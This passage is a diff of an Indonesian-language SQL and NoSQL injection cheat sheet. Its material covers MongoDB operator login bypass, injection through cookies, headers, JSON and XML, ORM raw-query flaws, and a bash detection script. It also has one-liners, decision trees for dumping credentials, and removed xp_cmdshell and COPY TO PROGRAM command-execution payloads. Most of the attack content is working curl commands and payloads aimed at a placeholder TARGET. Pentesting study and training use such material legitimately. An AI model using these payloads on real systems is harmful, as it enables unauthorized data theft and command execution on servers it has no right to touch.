+> `$where` memiliki risiko tambahan dan bukan fitur MongoDB modern yang direkomendasikan. Banyak deployment menonaktifkan ini.
+
+## Enumerate Username via $regex
+
+```bash
+curl -s -X POST http://TARGET/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}'
+```
+
+## Identify MongoDB Endpoint
+
+```bash
+# Cari indicator di source
+curl -s http://TARGET/app.js | grep -Ei "mongodb|mongoose|findOne|MongoClient"
 ```
 
 ---
 
-## Upgrade ke Command Execution
+# 📨 14. Special Contexts
 
-Uji dahulu:
+## 14.1 Cookie Injection
 
-```sql
-EXEC xp_cmdshell 'hostname';
 ```
-
-Kemudian:
-
-```sql
-EXEC xp_cmdshell 'whoami';
+[Burp] Modifikasi Cookie di Repeater:
+Cookie: user=admin'
+Cookie: user=admin'+AND+'1'='1-- -   (TRUE)
+Cookie: user=admin'+AND+'1'='2-- -   (FALSE)
 ```
-
-Untuk CTF biasanya tahap berikutnya adalah membangun shell callback dari command execution, tetapi keberhasilannya bergantung pada outbound connectivity, quoting, privilege, dan OS.
-
----
-
-# 11.3 PostgreSQL — COPY TO/FROM PROGRAM
-
-## 📌 Kapan Digunakan
-
-Saat:
-
-```text
-PostgreSQL
-+
-superuser/appropriate privilege
-+
-COPY ... PROGRAM available
-```
-
-Contoh:
-
-```sql
-COPY (SELECT '') TO PROGRAM 'id';
-```
-
-atau:
-
-```sql
-COPY test FROM PROGRAM 'id';
-```
-
-Expected:
-
-```text
-command output / execution side effect
-```
-
-Pada PostgreSQL, privilege untuk `COPY PROGRAM` sangat penting.
-
----
-
-# 🍃 12. NoSQL Injection
-
-# 12.1 MongoDB Injection
-
-## 📌 Kapan Digunakan
-
-Saat aplikasi menggunakan MongoDB dan input user langsung dimasukkan ke query/object.
-
-Contoh insecure logic:
-
-```javascript
-db.users.findOne({
-    username: req.body.username,
-    password: req.body.password
-})
-```
-
----
-
-## `$ne`
-
-Conceptual payload:
-
-```json
-{
-  "username": "admin",
-  "password": {
-    "$ne": null
-  }
-}
-```
-
----
-
-## `$regex`
-
-```json
-{
-  "username": {
-    "$regex": "^admin"
-  }
-}
-```
-
----
-
-## `$where`
-
-Legacy/unsafe pattern:
-
-```json
-{
-  "$where": "this.username == 'admin'"
-}
-```
-
-`$where` memiliki risiko tambahan dan bukan pilihan utama MongoDB modern.
-
----
-
-## Authentication Bypass Concept
-
-Jika backend menerima object operator langsung:
-
-```text
-password = {"$ne": null}
-```
-
-maka query:
-
-```text
-password != null
-```
-
-dapat membuat login bypass pada implementasi tertentu.
-
----
-
-# 12.2 Cara Test NoSQL Injection
-
-## Identify Endpoint
-
-Cari:
-
-```text
-MongoDB
-mongoose
-mongodb://
-MongoClient
-findOne(
-find(
-aggregate(
-```
-
-Source code:
 
 ```bash
-curl -s http://TARGET/app.js | grep -Ei \
-'mongodb|mongoose|findOne|MongoClient'
+curl -s http://TARGET/profile -H "Cookie: user=admin' AND 1=1-- -" | wc -c
+curl -s http://TARGET/profile -H "Cookie: user=admin' AND 1=2-- -" | wc -c
 ```
 
----
+## 14.2 HTTP Header Injection
 
-## JSON Test
+```
+[Burp] Ubah header di Repeater:
+User-Agent: test'+AND+1=1-- -
+X-Forwarded-For: 10.0.0.1'+AND+1=1-- -
+Referer: http://example.com/'+AND+1=1-- -
+```
 
 ```bash
-curl -i -X POST http://TARGET/login \
--H 'Content-Type: application/json' \
--d '{"username":"admin","password":{"$ne":null}}'
+curl -s http://TARGET/ -H "User-Agent: test' AND 1=1-- -"
+curl -s http://TARGET/ -H "X-Forwarded-For: 10.0.0.1' AND 1=1-- -"
 ```
 
-Compare dengan:
+## 14.3 JSON Body Injection
+
+```
+[Burp] POST body modification:
+{"id":"10 UNION SELECT username,password FROM users-- -"}
+{"search":"test'+UNION+SELECT+NULL,NULL-- -"}
+```
 
 ```bash
-curl -i -X POST http://TARGET/login \
--H 'Content-Type: application/json' \
--d '{"username":"admin","password":"wrong"}'
+curl -s -X POST http://TARGET/api/item \
+  -H 'Content-Type: application/json' \
+  -d '{"id":"10 AND 1=1-- -"}' | wc -c
+
+curl -s -X POST http://TARGET/api/item \
+  -H 'Content-Type: application/json' \
+  -d '{"id":"10 AND 1=2-- -"}' | wc -c
 ```
 
-Potential indication:
+## 14.4 XML Body Injection
 
-```text
-wrong password → 401
-$ne payload     → 200
+```xml
+<!-- Inject langsung -->
+<id>10 UNION SELECT NULL--</id>
+
+<!-- Dengan XML encoding (WAF bypass — lihat Section 9.1) -->
+<id>10 &#x55;NION &#x53;ELECT NULL--</id>
 ```
-
----
-
-# 📨 13. Special Contexts
-
-# 13.1 SQLi dalam Cookie
-
-## 📌 Kapan Digunakan
-
-Saat aplikasi memakai cookie sebagai database lookup/filter.
-
-Test:
 
 ```bash
-curl -i http://TARGET/profile \
--H "Cookie: user=admin'"
-```
-
-Boolean:
-
-```bash
-curl -i http://TARGET/profile \
--H "Cookie: user=admin' AND 1=1-- -"
-```
-
-False:
-
-```bash
-curl -i http://TARGET/profile \
--H "Cookie: user=admin' AND 1=2-- -"
-```
-
----
-
-# 13.2 SQLi dalam HTTP Header
-
-## 📌 Kapan Digunakan
-
-Saat backend menyimpan/logging header lalu memakainya dalam query.
-
-### User-Agent
-
-```bash
-curl -i http://TARGET/ \
--H "User-Agent: test'"
-```
-
-Boolean:
-
-```bash
-curl -i http://TARGET/ \
--H "User-Agent: test' AND 1=1-- -"
-```
-
-### X-Forwarded-For
-
-```bash
-curl -i http://TARGET/ \
--H "X-Forwarded-For: 10.0.0.1'"
-```
-
-### Referer
-
-```bash
-curl -i http://TARGET/ \
--H "Referer: http://example.com/'"
-```
-
-Perhatikan bahwa header injection harus punya sink server-side; header yang hanya ditampilkan oleh proxy tidak berarti SQLi.
-
----
-
-# 13.3 SQLi dalam JSON Body
-
-## 📌 Kapan Digunakan
-
-Saat API menerima structured JSON.
-
-Baseline:
-
-```bash
-curl -i -X POST http://TARGET/api/item \
--H 'Content-Type: application/json' \
--d '{"id":10}'
-```
-
-Test:
-
-```bash
-curl -i -X POST http://TARGET/api/item \
--H 'Content-Type: application/json' \
--d '{"id":"10'\"'\"'"}'
-```
-
-Boolean:
-
-```bash
-curl -i -X POST http://TARGET/api/item \
--H 'Content-Type: application/json' \
--d '{"id":"10 AND 1=1"}'
-```
-
----
-
-# 13.4 SQLi dalam XML
-
-## 📌 Kapan Digunakan
-
-Ketika API menerima XML dan nilai XML akhirnya masuk ke SQL query.
-
-Contoh:
-
-```bash
-curl -i -X POST http://TARGET/api \
--H 'Content-Type: application/xml' \
---data-binary @- <<'EOF'
+curl -s -X POST http://TARGET/api \
+  -H 'Content-Type: application/xml' \
+  --data-binary @- <<'EOF'
 <request>
   <id>10'</id>
 </request>
 EOF
 ```
 
-Boolean:
-
-```bash
-curl -i -X POST http://TARGET/api \
--H 'Content-Type: application/xml' \
---data-binary @- <<'EOF'
-<request>
-  <id>10 AND 1=1</id>
-</request>
-EOF
-```
-
 ---
 
-# 13.5 ORM Injection
+## 14.5 ORM Injection
 
-## 📌 Kapan Digunakan
-Ketika aplikasi web modern menggunakan framework Object-Relational Mapping (ORM) seperti:
-- **SQLAlchemy** (Python)
-- **Hibernate** (Java)
-- **Sequelize** (Node.js)
-- **Eloquent** (PHP / Laravel)
+### 📌 Kapan Digunakan
 
-Meskipun ORM secara default mengamankan query dengan parameter binding, kerentanan SQLi tetap terjadi jika developer menggunakan *raw query*, raw expressions, atau string concatenation/formatting langsung ke dalam query builder.
+Ketika aplikasi menggunakan ORM (SQLAlchemy, Hibernate, Sequelize, Eloquent) tetapi developer menggunakan raw query, raw expressions, atau string concatenation langsung ke query builder.
 
-### 1. SQLAlchemy (Python) — Raw Query Vulnerable vs Safe
+ORM aman jika pakai parameter binding. Rentan jika pakai raw query atau f-string/template.
+
+### SQLAlchemy (Python)
 
 ```python
-# ❌ VULNERABLE: String formatting / f-string langsung ke raw query
+# ❌ VULNERABLE — String formatting langsung ke raw query
 query = f"SELECT * FROM users WHERE name='{user_input}'"
 db.session.execute(query)
 
-# ✅ SAFE: Menggunakan parameter binding bawaan ORM
-db.session.execute("SELECT * FROM users WHERE name=:name", {"name": user_input})
-# ATAU query builder murni:
+# ✅ SAFE — Parameter binding
+db.session.execute(
+    "SELECT * FROM users WHERE name=:name",
+    {"name": user_input}
+)
+# ATAU query builder:
 User.query.filter_by(name=user_input).first()
 ```
 
-### 2. Sequelize (Node.js) — Raw Expressions
+### Sequelize (Node.js)
 
 ```javascript
-// ❌ VULNERABLE: Penggunaan sequelize.literal() dengan template literal
-User.findAll({ 
-    where: sequelize.literal(`name='${user_input}'`) 
+// ❌ VULNERABLE — Template literal di sequelize.literal()
+User.findAll({
+  where: sequelize.literal(`name='${user_input}'`)
 });
 
-// ✅ SAFE: Menggunakan parameter object standar Sequelize
-User.findAll({ 
-    where: { name: user_input } 
+// ✅ SAFE — Parameter object standar
+User.findAll({
+  where: { name: user_input }
 });
 ```
 
-### 3. Eloquent (PHP / Laravel) — Raw Methods
+### Eloquent (PHP / Laravel)
 
 ```php
-// ❌ VULNERABLE: whereRaw() dengan interpolasi string
+// ❌ VULNERABLE — whereRaw() dengan string interpolasi
 User::whereRaw("email = '{$email}'")->get();
 
-// ✅ SAFE: whereRaw() dengan parameter binding array
+// ✅ SAFE — whereRaw() dengan parameter binding array
 User::whereRaw("email = ?", [$email])->get();
 ```
 
-### 🔍 Cara Test ORM Injection
-Metodologi pengujian ORM Injection identik dengan SQL Injection biasa:
-1. Masukkan single quote (`'`) atau double quote (`"`) untuk memicu syntax error backend.
-2. Gunakan boolean difference: `' OR '1'='1` vs `' AND '1'='2`.
-3. Jika raw query dieksekusi di backend SQL (MySQL/PostgreSQL/SQLite), seluruh teknik UNION, Error-based, atau Time-based dapat diterapkan seperti biasa.
+### Cara Test ORM Injection
+
+Metodologi identik dengan SQL Injection biasa:
+
+1. Masukkan single quote `'` atau double quote `"` untuk memicu syntax error backend
+2. Gunakan boolean difference: `' OR '1'='1` vs `' AND '1'='2`
+3. Jika raw query dieksekusi di SQL backend, seluruh teknik UNION/Error/Boolean/Time berlaku seperti biasa
 
 ---
 
-# ⚙️ 14. Automation Scripts
+# ⚙️ 15. Automation Scripts
 
-# 14.1 Script `sqli_detect.sh`
+## 15.1 Script sqli_detect.sh
 
-## 📌 Kapan Digunakan
+### 📌 Kapan Digunakan
 
-Untuk screening awal parameter yang sudah Anda curigai.
-
-Input:
-
-```text
-URL
-parameter
-```
-
-Output:
-
-```text
-baseline
-quote test
-boolean TRUE
-boolean FALSE
-possible error
-possible time delay
-```
+Untuk screening awal parameter yang sudah dicurigai. Script ini menghasilkan baseline, quote test, boolean test, dan time test dalam satu run.
 
 ```bash
 #!/usr/bin/env bash
-
+# sqli_detect.sh — Basic SQLi detection screening
+# Usage: ./sqli_detect.sh <url_tanpa_param> <param_name>
+# Example: ./sqli_detect.sh 'http://TARGET/item' id
 set -u
 
 RED='\033[0;31m'
@@ -3932,2756 +2666,1114 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-usage() {
-    echo "Usage: $0 <url> <parameter>"
-    exit 1
-}
+usage() { echo "Usage: $0 <url> <parameter_name>"; exit 1; }
 
 [[ $# -eq 2 ]] || usage
 
 URL="$1"
 PARAM="$2"
 
+# Validate inputs
 if [[ ! "$URL" =~ ^https?:// ]]; then
-    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
-    exit 1
+  echo -e "${RED}[!] URL must start with http:// or https://${NC}"; exit 1
 fi
-
 if [[ "$URL" =~ [[:space:]] ]]; then
-    echo -e "${RED}[!] URL contains whitespace${NC}"
-    exit 1
+  echo -e "${RED}[!] URL contains whitespace${NC}"; exit 1
 fi
-
 if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
-    echo -e "${RED}[!] Invalid parameter name${NC}"
-    exit 1
+  echo -e "${RED}[!] Invalid parameter name (letters, numbers, _ - only)${NC}"; exit 1
 fi
-
 if ! command -v curl >/dev/null 2>&1; then
-    echo -e "${RED}[!] curl is required${NC}"
-    exit 1
+  echo -e "${RED}[!] curl is required${NC}"; exit 1
 fi
 
-TMP="$(mktemp -d)"
-trap 'rm -rf "$TMP"' EXIT
+TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
 
 echo -e "${BLUE}[*] URL       : $URL${NC}"
 echo -e "${BLUE}[*] Parameter : $PARAM${NC}"
-
 echo
+
+# 1. Baseline
 echo -e "${YELLOW}[1] Baseline${NC}"
+BASE_TIME=$(curl -ksS -o "$TMP/base" -w '%{time_total}' \
+  --get --data-urlencode "${PARAM}=10" "$URL")
+BASE_SIZE=$(wc -c < "$TMP/base")
+echo "    Time: ${BASE_TIME}s | Size: ${BASE_SIZE} bytes"
 
-BASE_TIME="$(
-    curl -ksS \
-    -o "$TMP/base" \
-    -w '%{time_total}' \
-    --get \
-    --data-urlencode "${PARAM}=10" \
-    "$URL"
-)"
-
-BASE_SIZE="$(wc -c < "$TMP/base")"
-
-echo "    time = ${BASE_TIME}s"
-echo "    size = ${BASE_SIZE}"
-
-echo
-echo -e "${YELLOW}[2] Single quote test${NC}"
-
-QUOTE_TIME="$(
-    curl -ksS \
-    -o "$TMP/quote" \
-    -w '%{time_total}' \
-    --get \
-    --data-urlencode "${PARAM}=10'" \
-    "$URL"
-)"
-
-QUOTE_SIZE="$(wc -c < "$TMP/quote")"
-
-echo "    time = ${QUOTE_TIME}s"
-echo "    size = ${QUOTE_SIZE}"
-
+# 2. Single quote
+echo -e "\n${YELLOW}[2] Single Quote Test${NC}"
+QUOTE_TIME=$(curl -ksS -o "$TMP/quote" -w '%{time_total}' \
+  --get --data-urlencode "${PARAM}=10'" "$URL")
+QUOTE_SIZE=$(wc -c < "$TMP/quote")
+echo "    Time: ${QUOTE_TIME}s | Size: ${QUOTE_SIZE} bytes"
 if grep -Eqi \
-    'sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception' \
-    "$TMP/quote"; then
-
-    echo -e "${RED}[+] SQL error indicator detected${NC}"
+  'sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception|unclosed quotation' \
+  "$TMP/quote"; then
+  echo -e "    ${RED}[!] SQL error indicator detected!${NC}"
 else
-    echo "[-] No obvious SQL error"
+  echo "    [-] No obvious SQL error in response"
 fi
 
-echo
-echo -e "${YELLOW}[3] Boolean TRUE test${NC}"
+# 3. Boolean TRUE
+echo -e "\n${YELLOW}[3] Boolean TRUE (AND 1=1)${NC}"
+TRUE_TIME=$(curl -ksS -o "$TMP/true" -w '%{time_total}' \
+  --get --data-urlencode "${PARAM}=10 AND 1=1-- -" "$URL")
+TRUE_SIZE=$(wc -c < "$TMP/true")
+echo "    Time: ${TRUE_TIME}s | Size: ${TRUE_SIZE} bytes"
 
-TRUE_TIME="$(
-    curl -ksS \
-    -o "$TMP/true" \
-    -w '%{time_total}' \
-    --get \
-    --data-urlencode "${PARAM}=10 AND 1=1" \
-    "$URL"
-)"
-
-TRUE_SIZE="$(wc -c < "$TMP/true")"
-
-echo "    time = ${TRUE_TIME}s"
-echo "    size = ${TRUE_SIZE}"
-
-echo
-echo -e "${YELLOW}[4] Boolean FALSE test${NC}"
-
-FALSE_TIME="$(
-    curl -ksS \
-    -o "$TMP/false" \
-    -w '%{time_total}' \
-    --get \
-    --data-urlencode "${PARAM}=10 AND 1=2" \
-    "$URL"
-)"
-
-FALSE_SIZE="$(wc -c < "$TMP/false")"
-
-echo "    time = ${FALSE_TIME}s"
-echo "    size = ${FALSE_SIZE}"
+# 4. Boolean FALSE
+echo -e "\n${YELLOW}[4] Boolean FALSE (AND 1=2)${NC}"
+FALSE_TIME=$(curl -ksS -o "$TMP/false" -w '%{time_total}' \
+  --get --data-urlencode "${PARAM}=10 AND 1=2-- -" "$URL")
+FALSE_SIZE=$(wc -c < "$TMP/false")
+echo "    Time: ${FALSE_TIME}s | Size: ${FALSE_SIZE} bytes"
 
 if [[ "$TRUE_SIZE" != "$FALSE_SIZE" ]]; then
-    echo -e "${GREEN}[+] Response-size difference detected${NC}"
-    echo -e "${GREEN}[+] Boolean blind candidate${NC}"
+  echo -e "    ${GREEN}[!] Boolean difference! TRUE=${TRUE_SIZE} FALSE=${FALSE_SIZE}${NC}"
 else
-    echo "[-] No obvious boolean size difference"
+  echo "    [-] No boolean size difference"
 fi
 
-echo
-echo -e "${YELLOW}[5] Time-based test${NC}"
+# 5. Time-based (MySQL SLEEP syntax)
+echo -e "\n${YELLOW}[5] Time-Based (MySQL SLEEP(5))${NC}"
+TIME_VAL=$(curl -ksS -o /dev/null -w '%{time_total}' \
+  --get --data-urlencode "${PARAM}=10 AND SLEEP(5)-- -" "$URL")
+echo "    Time: ${TIME_VAL}s"
+awk -v t="$TIME_VAL" 'BEGIN { exit !(t >= 4.0) }' && \
+  echo -e "    ${GREEN}[!] Possible time-based SQLi! (MySQL SLEEP)${NC}" || \
+  echo "    [-] No significant delay"
 
-TIME_TIME="$(
-    curl -ksS \
-    -o "$TMP/time" \
-    -w '%{time_total}' \
-    --get \
-    --data-urlencode "${PARAM}=10 AND SLEEP(5)" \
-    "$URL"
-)"
-
-echo "    time = ${TIME_TIME}s"
-
-if awk -v t="$TIME_TIME" 'BEGIN { exit !(t >= 4.0) }'; then
-    echo -e "${GREEN}[+] Possible time-based SQLi${NC}"
-else
-    echo "[-] No obvious 5-second delay"
-fi
-
+# Summary
 echo
 echo -e "${YELLOW}=== Summary ===${NC}"
 echo "Baseline : ${BASE_TIME}s / ${BASE_SIZE} bytes"
 echo "Quote    : ${QUOTE_TIME}s / ${QUOTE_SIZE} bytes"
 echo "TRUE     : ${TRUE_TIME}s / ${TRUE_SIZE} bytes"
 echo "FALSE    : ${FALSE_TIME}s / ${FALSE_SIZE} bytes"
-echo "SLEEP    : ${TIME_TIME}s"
+echo "SLEEP    : ${TIME_VAL}s"
 
 echo
 echo -e "${YELLOW}Next steps:${NC}"
-echo "1. Confirm DB type"
-echo "2. Determine injection context"
-echo "3. Determine column count if UNION candidate"
-echo "4. Validate manually with Burp"
-echo "5. Use sqlmap after manual confirmation"
+echo "1. If SQL error → Section 4 (Error-Based)"
+echo "2. If TRUE≠FALSE → Section 5 (Boolean Blind)"
+echo "3. If SLEEP delay → Section 6 (Time-Based), also test pg_sleep/WAITFOR"
+echo "4. Confirm DB type (Section 1.4)"
+echo "5. Identify injection context (Section 1.5)"
+echo "6. Validate manually with Burp before SQLMap"
 ```
-
-Jalankan:
 
 ```bash
 chmod +x sqli_detect.sh
 ./sqli_detect.sh 'http://TARGET/item' id
+./sqli_detect.sh 'http://TARGET/filter' category
 ```
 
-> Script ini memakai sintaks `AND SLEEP(5)` untuk test time-based, sehingga bagian tersebut secara native paling cocok untuk MySQL/MariaDB. Untuk DB lain, ubah expression delay.
+> **Note:** Script menggunakan `AND SLEEP(5)` untuk time-based — secara native paling cocok untuk MySQL/MariaDB. Untuk DB lain, test manual dengan syntax yang sesuai (Section 6.3).
 
 ---
 
-# 14.2 One-Liners
+## 15.2 Boolean Blind Python Extractor
 
-## Quick Boolean Test
+Lihat Section 5.4 untuk script lengkap dengan argparse, URL validation, dan parameter validation.
+
+---
+
+## 15.3 One-Liners
 
 ```bash
-curl -s -o true.txt 'http://TARGET/item?id=10%20AND%201=1'; curl -s -o false.txt 'http://TARGET/item?id=10%20AND%201=2'; wc -c true.txt false.txt
+# Boolean diff check cepat
+curl -s -o t.html 'http://TARGET/item?id=10%20AND%201=1-- -'
+curl -s -o f.html 'http://TARGET/item?id=10%20AND%201=2-- -'
+wc -c t.html f.html
+
+# Quick error check
+curl -si 'http://TARGET/item?id=10%27' | grep -iE "(sql|error|syntax|mysql|oracle)"
+
+# Quick UNION column test (3 columns)
+curl -s 'http://TARGET/item?id=10%27+UNION+SELECT+NULL,NULL,NULL-- -' | wc -c
+
+# Quick MySQL time test
+time curl -s -o /dev/null --get \
+  --data-urlencode "id=10 AND SLEEP(5)-- -" 'http://TARGET/item'
+
+# Quick PgSQL time test
+time curl -s -o /dev/null --get \
+  --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(5))-- -" 'http://TARGET/item'
+
+# Quick wafw00f scan
+wafw00f http://TARGET
 ```
 
----
+# 🌳 16. Decision Trees
 
-## Quick Error Test
+> Decision trees di sini bersifat **operational**: setiap branch menjawab pertanyaan konkret dan mengarah ke langkah nyata.
 
-```bash
-curl -i --get --data-urlencode "id=10'" http://TARGET/item
+## 16.1 Core Detection Decision Tree
+
 ```
-
----
-
-## Quick Time Test — MySQL
-
-```bash
-time curl -s -o /dev/null --get --data-urlencode "id=10 AND SLEEP(5)" http://TARGET/item
-```
-
----
-
-## Quick UNION Test
-
-```bash
-curl -s --get --data-urlencode "id=10 UNION SELECT NULL,NULL,NULL-- -" http://TARGET/item
-```
-
----
-
-## Quick sqlmap Detect
-
-```bash
-sqlmap -u "http://TARGET/item?id=10" -p id --batch
-```
-
----
-
-# 🌳 15. Decision Tree
-
-## SQL Injection Standalone Decision Tree
-
-```text
-TRIGGER:
-Ditemukan input parameter
-        │
-        ▼
-Test dengan single quote
-        │
-        ├── SQL Error
-        │      │
-        │      ▼
-        │   Error-Based SQLi
-        │
-        ├── Generic Error
-        │      │
-        │      ▼
-        │   Test Boolean / Time
-        │
-        ├── No Difference
-        │      │
-        │      ├── Test encoded quote
-        │      ├── Test numeric context
-        │      ├── Test other parameter
-        │      └── Inspect request/response
-        │
-        └── Behavior Change
-               │
-               ▼
-          Boolean Blind Candidate
-               │
-               ├── UNION works?
-               │       │
-               │       ├── YES
-               │       │    │
-               │       │    ▼
-               │       │  Determine columns
-               │       │    │
-               │       │    ▼
-               │       │  Find visible column
-               │       │    │
-               │       │    ▼
-               │       │  Enumerate DB
-               │       │    │
-               │       │    ▼
-               │       │  Tables
-               │       │    │
-               │       │    ▼
-               │       │  Columns
-               │       │    │
-               │       │    ▼
-               │       │  Data
-               │       │
-               │       └── NO
-               │            │
-               │            ▼
-               │        Blind SQLi
-               │            │
-               │            ├── Boolean
-               │            │
-               │            └── Time-Based
-               │
-               ▼
-          WAF / Filtering?
-               │
-          ┌────┴────┐
-         YES        NO
-          │          │
-          ▼          ▼
-       Fingerprint  sqlmap
+INPUT PARAMETER DITEMUKAN (GET/POST/Cookie/Header/XML)
           │
           ▼
-       Tamper only
-       as required
+    [FASE 0] Ambil baseline → petakan tech stack
+          │
+          ▼
+    [FASE 1] Inject single quote '
+          │
+          ├── SQL Error visible
+          │      │
+          │      ▼
+          │   Error-Based SQLi CANDIDATE
+          │      │
+          │      ▼
+          │   Validate: coba UNION (Section 3)
+          │   atau CAST/CONVERT extraction (Section 4)
+          │
+          ├── Response berbeda (size/content)
+          │      │
+          │      ▼
+          │   Boolean Blind CANDIDATE
+          │      │
+          │      ▼
+          │   Validate: TRUE vs FALSE test (Section 5)
+          │
+          ├── Delay ~5-10 detik
+          │      │
+          │      ▼
+          │   Time-Based CANDIDATE
+          │      │
+          │      ▼
+          │   Validate: ulangi delay test, cek baseline (Section 6)
+          │
+          └── Tidak ada perbedaan
+                 │
+                 ▼
+              Jangan simpulkan "tidak ada SQLi"
+                 │
+              ├── Test context berbeda (numeric vs string)
+              ├── Test parameter lain
+              ├── Test Cookie / Header
+              ├── Test Login context (Section 2)
+              └── Test OOB jika ada Burp Collaborator (Section 7)
+```
+
+**Perbedaan CANDIDATE vs VALIDATED FINDING:**
+
+|State|Arti|
+|---|---|
+|CANDIDATE|Observasi menunjukkan kemungkinan SQLi|
+|INDICATION|Beberapa test konsisten menunjukkan SQLi|
+|CONFIRMED|Bisa extract data atau trigger controlled error|
+|IMPACT|Terbukti bisa akses data sensitif|
+
+---
+
+## 16.2 UNION Execution Path
+
+```
+Confirmed SQLi + In-Band response
+     │
+     ▼
+ORDER BY / NULL method → Column count
+     │
+     ▼
+UNION SELECT 'A','B','C'... → Displayable columns
+     │
+     ▼
+version(), database(), user() → DB fingerprint
+     │
+     ▼
+information_schema / all_tables → Table names
+     │
+     ▼
+information_schema.columns / all_tab_columns → Column names
+     │
+     ▼
+Dump: username||'~'||password FROM users
+     │
+     ▼
+Validate: data tersebut valid? (cek format, tipe)
 ```
 
 ---
 
-## Database-Specific Decision
+## 16.3 DB-Specific Capabilities
 
-```text
+```
 DB Identified
      │
      ├── MySQL
-     │    ├── database()
-     │    ├── SLEEP()
-     │    ├── information_schema
-     │    └── INTO OUTFILE
+     │   ├── @@version, database(), user()
+     │   ├── information_schema
+     │   ├── SLEEP() time-based
+     │   ├── INTO OUTFILE (jika FILE priv + writable path)
+     │   └── GROUP_CONCAT untuk bulk enum
      │
      ├── PostgreSQL
-     │    ├── current_database()
-     │    ├── pg_sleep()
-     │    ├── information_schema / pg_catalog
-     │    └── COPY ... PROGRAM (privileged)
+     │   ├── version(), current_database(), current_user
+     │   ├── information_schema + pg_catalog
+     │   ├── pg_sleep() time-based (gunakan subquery wrapper)
+     │   ├── COPY ... PROGRAM (jika superuser)
+     │   └── CAST error-based
      │
      ├── MSSQL
-     │    ├── DB_NAME()
-     │    ├── WAITFOR DELAY
-     │    ├── sys.tables
-     │    └── xp_cmdshell
+     │   ├── @@VERSION, DB_NAME(), SYSTEM_USER
+     │   ├── sys.tables, sys.columns
+     │   ├── WAITFOR DELAY time-based (stacked)
+     │   ├── xp_cmdshell (jika sysadmin)
+     │   └── CONVERT error-based
      │
      ├── Oracle
-     │    ├── USER
-     │    ├── v$version
-     │    ├── all_tables
-     │    └── DBMS_* primitives
+     │   ├── v$version, all_tables, all_tab_columns
+     │   ├── USER, SYS_CONTEXT FROM dual
+     │   ├── DBMS_PIPE.RECEIVE_MESSAGE time-based
+     │   ├── EXTRACTVALUE DNS OOB
+     │   └── Wajib FROM DUAL untuk SELECT tanpa tabel
      │
      └── SQLite
-          ├── sqlite_version()
-          ├── sqlite_master
-          └── limited server-side execution primitives
+         ├── sqlite_version()
+         ├── sqlite_master (TIDAK ADA information_schema)
+         ├── group_concat() untuk bulk
+         └── TIDAK ADA native SLEEP() — time-based tidak applicable
 ```
 
 ---
 
-## UNION Decision Tree
+## 16.4 Technique Selection
 
-```text
-UNION Candidate
-     │
-     ▼
-ORDER BY
-     │
-     ├── 1 ✅
-     ├── 2 ✅
-     ├── 3 ✅
-     └── 4 ❌
-          │
-          ▼
-     Columns = 3
-          │
-          ▼
-UNION SELECT NULL,NULL,NULL
-          │
-          ▼
-Replace NULL
-          │
-          ▼
-'A','B','C'
-          │
-          ▼
-Find visible column
-          │
-          ▼
-Database Name
-          │
-          ▼
-Table Names
-          │
-          ▼
-Column Names
-          │
-          ▼
-Target Data
+```
+Confirmed SQLi → Pilih teknik berdasarkan kondisi:
+
+Response menampilkan data → UNION (Section 3)
+   │
+   ▼
+Tidak menampilkan data tapi ada SQL error → Error-Based (Section 4)
+   │
+   ▼
+Tidak ada error tapi response berbeda TRUE/FALSE → Boolean Blind (Section 5)
+   │
+   ▼
+Tidak ada perbedaan tapi bisa trigger delay → Time-Based (Section 6)
+   │
+   ▼
+Tidak ada output, delay tidak reliable, DB bisa callback → OOB (Section 7)
 ```
 
 ---
 
-# 🛠️ 16. Common Errors & Troubleshooting
+# 🛠️ 17. Troubleshooting
 
-|Error|Sebab|Solusi|
-|---|---|---|
-|sqlmap tidak detect|Parameter tidak injectable|Validasi manual dengan quote/boolean terlebih dahulu|
-|sqlmap tidak detect tetapi manual berhasil|WAF/CSRF/request complexity|Gunakan `-r request.txt`, cookie, header, atau parameter yang tepat|
-|UNION menghasilkan error|Jumlah kolom salah|Gunakan `ORDER BY` atau `NULL` method|
-|UNION berhasil tetapi data tidak terlihat|Column tidak displayable|Test `'A','B','C'` untuk menemukan output column|
-|Single quote menghasilkan 500|Bisa SQL error|Inspect response body dan headers|
-|Tidak ada SQL error|Error handling disembunyikan|Coba Boolean Blind|
-|Boolean TRUE/FALSE sama|Wrong syntax/context|Coba numeric/string context yang sesuai|
-|Time-based tidak delay|Wrong DB syntax|Identifikasi DB lalu pakai sleep function yang benar|
-|Time-based terlalu lambat|Jaringan/WAF/server latency|Gunakan baseline dan threshold yang lebih konservatif|
-|False positive|Response memang berubah karena parameter|Bandingkan beberapa baseline|
-|WAF blocking|Signature match|Identify exact blocking pattern; gunakan encoding/tamper yang relevan, bukan random|
-|`space2comment` membuat query gagal|DB/parser tidak cocok|Hapus tamper atau gunakan tamper lain|
-|Permission denied `INTO OUTFILE`|Tidak punya FILE privilege|Check privileges/`secure_file_priv`|
-|Webshell tidak dapat diakses|Wrong directory / web root|Identifikasi document root dan write permission|
-|`xp_cmdshell` disabled|Feature disabled|Cek privilege dan configuration pada lab|
-|`COPY ... PROGRAM` gagal|Tidak superuser/privilege tidak cukup|Check PostgreSQL role privileges|
-|`ORDER BY` tidak memberi perbedaan|Endpoint tidak benar atau query context berbeda|Gunakan `UNION SELECT NULL` method|
-|`--` tidak bekerja|Comment syntax/spacing salah|Sesuaikan comment syntax dengan DB|
-|MySQL `#` tidak bekerja|Context/encoding berbeda|Gunakan `-- -` atau syntax comment yang sesuai|
-|SQLMap terlalu banyak request|Level/risk tinggi|Mulai `--level=1 --risk=1`|
-|SQLMap dump kosong|Table/column salah atau data kosong|Enumerate tables/columns ulang|
-|JSON injection tidak bekerja|Backend bukan string-concatenation / prepared query|Inspect request and backend clues|
-|Cookie injection tidak bekerja|Cookie tidak dipakai dalam SQL|Cari parameter/sink lain|
-|Header injection tidak bekerja|Header hanya dipakai oleh proxy/webserver|Cari server-side logging/query sink|
-|Double encoding tidak berhasil|App hanya decode sekali|Jangan gunakan tanpa bukti multiple decoding|
